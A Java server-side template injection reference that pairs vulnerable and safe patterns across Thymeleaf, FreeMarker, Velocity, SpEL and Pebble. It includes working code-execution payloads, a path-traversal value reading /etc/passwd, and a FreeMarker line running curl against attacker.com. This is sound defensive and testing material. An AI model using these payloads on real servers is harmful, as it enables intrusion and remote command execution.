# Java Server-Side Template Injection Reference — Engines, Payloads & Safe Patterns

## Template Engine Sink Risk Table

| Engine | Vulnerable Pattern | Safe Pattern |
|--------|-------------------|-------------|
| Thymeleaf | Return user input as view name | Return static view name; user data via `Model` |
| Thymeleaf | `"Hello " + name` as view string | Always return a literal like `"greetingView"` |
| FreeMarker | `new Template("", new StringReader(userInput), cfg)` | Use pre-compiled templates from classpath |
| FreeMarker | `cfg.getTemplate(userControlledName)` | Restrict template directory; validate name |
| Velocity | `Velocity.evaluate(ctx, writer, "tag", userInput)` | User input in model only, not template string |
| Pebble | `engine.getLiteralTemplate(userInput)` | Use `engine.getTemplate("file.pebble")` |
| Mustache | Template string from user input | Template files from classpath only |
| Handlebars | `Handlebars.compile(userInput)` | Compile from classpath resources |
| SpEL | `parser.parseExpression(userInput).getValue(ctx)` with `StandardEvaluationContext` | Use `SimpleEvaluationContext`; never evaluate user strings |
| Groovy Templates | `new groovy.text.GStringTemplateEngine().createTemplate(userInput)` | Templates from controlled sources only |

## Thymeleaf-Specific Patterns

### Fragment Expression Injection (CVE-2023-38286 pattern)
```java
// DANGEROUS — user input used as template fragment or view name
@GetMapping("/")
public String index(@RequestParam String lang) {
    return "fragments/" + lang + " :: content";  // Path traversal + SSTI
}
// Payload: lang=../../../../../etc/passwd
// Or SSTI: lang=__${T(java.lang.Runtime).getRuntime().exec('id')}__

// SAFE
@GetMapping("/")
public String index(@RequestParam String lang, Model model) {
    if (!ALLOWED_LANGS.contains(lang)) lang = "en";
    model.addAttribute("lang", lang);  // user data in model, not template path
    return "index";  // static view name
}
```

### Expression Processing in Unescaped Contexts
```html
<!-- SAFE — Thymeleaf escapes by default -->
<p th:text="${userInput}">output</p>

<!-- DANGEROUS — th:utext disables escaping, allows HTML injection -->
<p th:utext="${userInput}">output</p>

<!-- DANGEROUS — inline expression includes user input in expression context -->
<p>[[${userInput}]]</p>  <!-- same as th:text -->
<p>[(${userInput})]</p>  <!-- same as th:utext — unescaped -->
```

## FreeMarker Payloads

```
${7*7}                  → Confirm evaluation: response shows 49
${"freemarker.template.utility.Execute"?new()("id")}   → RCE
${"freemarker.template.utility.Execute"?new()("curl http://attacker.com")}
${product.getClass().getProtectionDomain().getCodeSource()}  → Info disclosure
```

FreeMarker `Execute` class is available by default — no external gadget needed.

**Safe FreeMarker config:**
```java
Configuration cfg = new Configuration(Configuration.VERSION_2_3_32);
cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
// Or block Execute entirely:
cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
```

## Velocity Payloads

```
#set($e = "exp")
$e.class.forName("java.lang.Runtime").getMethod("exec", $e.class).invoke(
    $e.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),
    "id"
)

## Or use class tool:
$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
```

## SpEL Payloads (StandardEvaluationContext)

```
T(java.lang.Runtime).getRuntime().exec('id')
T(java.lang.ProcessBuilder).new(new String[]{'id'}).start()
new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()
```

**Safe SpEL usage:**
```java
// DANGEROUS — full reflection access
ExpressionParser parser = new SpelExpressionParser();
StandardEvaluationContext context = new StandardEvaluationContext();
parser.parseExpression(userInput).getValue(context);

// SAFE — restricted context with no reflection
SimpleEvaluationContext context = SimpleEvaluationContext
    .forReadOnlyDataBinding()
    .withInstanceMethods()
    .build();
// Blocks T(...), new ..., reflection methods
```

## Pebble Payloads

```
{{ someString.toUpper() }}         → Test method invocation
{% for f in "".class.superclass.getDeclaredFields() %}{{ f }}{% endfor %}  → Reflection
// Pebble ≥ 3.1.5 blocks reflection by default via SecurityPolicy
```

## Confirmation Steps

To distinguish template injection from reflected XSS:
1. Inject `${7*7}` — if response shows `49`, template injection confirmed
2. Inject `{{7*7}}` — confirms Pebble, Jinja-style engines
3. Inject `<%= 7*7 %>` — JSP expression (only if JSP is used)
4. If response shows literal `${7*7}`, check if it's rendered as HTML (XSS) or ignored

## Safe Patterns Across All Engines

| Pattern | Why Safe |
|---------|---------|
| Template loaded from classpath resource | File path not user-controlled |
| User input passed only to model/context, not template string | Engine evaluates fixed template |
| Template name validated against allowlist before loading | Known-good files only |
| FreeMarker `ALLOWS_NOTHING_RESOLVER` | Blocks `?new()` entirely |
| SpEL `SimpleEvaluationContext` | No reflection, no `T()` operator |
| Thymeleaf with static view name + `Model.addAttribute` | Standard MVC pattern — safe |
